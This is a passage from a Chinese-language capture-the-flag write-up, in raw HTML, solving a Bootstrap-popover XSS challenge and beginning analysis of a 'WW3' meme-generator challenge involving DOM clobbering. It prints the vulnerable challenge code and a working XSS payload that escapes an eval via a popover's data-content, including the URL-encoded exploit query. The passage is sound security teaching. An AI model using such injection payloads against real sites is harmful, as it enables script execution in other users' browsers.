popover 弄到 number 标签当中呢？于是我们可以尝试构造如下 payload ：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"keanu"</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">"popover"</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">"#number"</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">"hello"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>利用题目中原有的<code>$("#keanu").popover("show");</code>来触发我们的 popover ，我们暂且先注释掉题目当中的延迟关闭的功能以便于我们观察。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201165048.png" alt=""></p><p>尽管 eval 执行出错，但是我们可以发现 number 标签当中确实被我们注入了一些其他的内容</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"popover fade bs-popover-right show"</span> <span class="hljs-attr">role</span>=<span class="hljs-string">"tooltip"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"popover238474"</span> <span class="hljs-attr">x-placement</span>=<span class="hljs-string">"right"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"position: absolute;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"arrow"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"popover-header"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"popover-body"</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们这样我们简化一下这个内容:<code>7&lt;template&gt;hello&lt;/template&gt;</code>，我们可控的地方就是 7 与 hello ，<code>&lt;template&gt;</code>就是 popper.js 实现的 popover 功能的代码，这个我们不需要关注，所以这样问题就变成了如何在<code>$str="$1&lt;template&gt;$any&lt;/template&gt;";eval($str);</code>当中执行代码的问题了。</p><p>到这里其实答案已经呼之欲出了，既然是在<code>eval</code>当中，我们可以利用第一位为单引号，由于中间<code>$any</code>我们任意可控，后面再用一个单引号将<code>&lt;template&gt;</code>变成字符串，<code>//</code>注释掉后面的<code>&lt;/template&gt;</code>即可，整个 payload 即是<code>'&lt;tamplate&gt;';alert();//&lt;/tamplate&gt;</code>。</p><p>所以我们需要这么构造一个元素：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"keanu"</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">"popover"</span> <span class="hljs-attr">data-container</span>=<span class="hljs-string">"#number"</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">"';alert(1);//"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>即可实现 XSS，所以 payload:</p><p></p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">number</span>='&amp;name=&lt;button id<span class="hljs-number">%3</span>D<span class="hljs-string">"keanu"</span> data-toggle<span class="hljs-number">%3</span>D<span class="hljs-string">"popover"</span> data-container<span class="hljs-number">%3</span>D<span class="hljs-string">"%23number"</span> data-content<span class="hljs-number">%3</span>D<span class="hljs-string">"'%3Balert(1)%3B%2F%2F"</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201170536.png" alt=""></p><h2 id="WW3"><a href="#WW3" class="headerlink" title="WW3"></a>WW3</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>Meme Code<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"meme-code"</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">"4"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"notify"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Utils */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function">(<span class="hljs-params">dirty</span>) =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;'"=]/g</span>, <span class="hljs-string">''</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">        return (`<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">'https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap'</span>);`+</span></span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span>+</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span>+</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"meme-card"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"${img}"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>${text}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">        if (text &amp;&amp; img) {</span><br><span class="line">            template = memeTemplate(img, text)</span><br><span class="line"></span><br><span class="line">            if (notify) {</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                html = (`<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"alert alert-warning"</span> <span class="hljs-attr">role</span>=<span class="hljs-string">"alert"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Meme<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> created from ${DOMPurify.sanitize(text)}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`)</span></span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">            setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">'#status'</span>).remove()</span></span><br><span class="line"><span class="hljs-javascript">                notify ? ($(<span class="hljs-string">'#notify'</span>).html(html)) : <span class="hljs-string">''</span></span></span><br><span class="line"><span class="hljs-javascript">                $(<span class="hljs-string">'#meme-code'</span>).text(template)</span></span><br><span class="line">            }, 1000)</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">'text'</span>)</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">'img'</span>)</span></span><br><span class="line">    if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">            `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"alert alert-primary"</span> <span class="hljs-attr">role</span>=<span class="hljs-string">"alert"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"status"</span>&gt;</span>`+</span></span></span><br><span class="line"><span class="hljs-actionscript">            `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">circle</span>" <span class="hljs-title">src</span>="$</span>{escape(img)}<span class="hljs-string">" onload="</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">"&gt;`+</span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">        )</span><br><span class="line"><span class="hljs-actionscript">    } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">'#meme-code'</span>).text(memeTemplate(<span class="hljs-string">'https://i.imgur.com/PdbDexI.jpg'</span>, <span class="hljs-string">'When you get that WW3 draft letter'</span>))</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这个题目让我深深地体会到了 JavaScript 的恶意…先放个图，大家自行先体会一下，然后我们开始分析一下题目。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.redd.it/rz3o1yibnc511.png" alt=""></p><p>题目用比较多的代码做了一个获取图片以及输出自定义 text 的功能，仍旧是上题的四个外部 JS 文件，以及一大段 JS 代码。本题涉及到 JavaScript 比较多的黑魔法，我们一个个来看看。</p><p>审计代码，我们可以先看到题目定义了几个函数</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function"><span class="hljs-params">dirty</span> =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;'"=]/g</span>, <span class="hljs-string">""</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>用来过滤我们的 img 参数</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> (</span><br><span class="line">    <span class="hljs-string">`&lt;style&gt;@import url('https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap');`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span> +</span><br><span class="line">    <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span> +</span><br><span class="line">    <span class="hljs-string">`&lt;div class="meme-card"&gt;&lt;img src="<span class="hljs-subst">${img}</span>"&gt;&lt;h1&gt;<span class="hljs-subst">${text}</span>&lt;/h1&gt;&lt;/div&gt;`</span></span><br><span class="line">  );</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>用来将我们传入的 img &amp; text 参数构造一个 HTML 模版</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (notify) {</span><br><span class="line">      html = <span class="hljs-string">`&lt;div class="alert alert-warning" role="alert"&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">        text</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">      )}</span>&lt;/div&gt;`</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span><br><span class="line">      $(<span class="hljs-string">"#status"</span>).remove();</span><br><span class="line">      notify ? $(<span class="hljs-string">"#notify"</span>).html(html) : <span class="hljs-string">""</span>;</span><br><span class="line">      $(<span class="hljs-string">"#meme-code"</span>).text(template);</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>用来进行 DOM 元素操作等，看起来我们的目标就是<code>setTimeout</code>函数中通过<code>$("#notify").html(html)</code>来执行代码了，所以我们可能需要想办法把 notify 参数设置为 true。</p><h3 id="DOM-Clobbering"><a href="#DOM-Clobbering" class="headerlink" title="DOM Clobbering"></a>DOM Clobbering</h3><p>首先我们先来看看几个比较有趣的例子：</p><p><img 